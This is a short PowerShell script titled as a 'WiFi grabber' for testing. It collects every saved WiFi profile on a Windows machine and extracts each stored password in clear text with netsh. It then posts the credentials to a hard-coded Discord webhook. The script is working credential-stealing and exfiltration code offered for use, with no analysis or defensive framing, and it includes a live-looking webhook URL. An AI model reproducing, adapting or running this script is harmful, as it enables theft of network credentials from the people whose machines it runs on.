# Minimal WiFi Grabber Script for Testing

try {
    # Collect WiFi profiles
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ": ")[1].Trim() }

    # Initialize WiFi credentials variable
    $wifiCreds = ""

    # Loop through each profile and retrieve the key (password)
    foreach ($profile in $profiles) {
        $details = netsh wlan show profile name="$profile" key=clear | Select-String "(SSID name|Key Content)"
        $wifiCreds += "`nProfile: $profile`n$details`n"
    }

    # Send credentials to Discord webhook (replace with your webhook URL)
    $webhook = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"
    $body = @{ content = "WiFi Credentials:`n```$wifiCreds```" } | ConvertTo-Json -Depth 10

    Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType 'application/json'

} catch {
    # Simple error logging
    "Error: $($_.Exception.Message)" | Out-File -FilePath "C:\temp\wifi_error.log" -Append
}
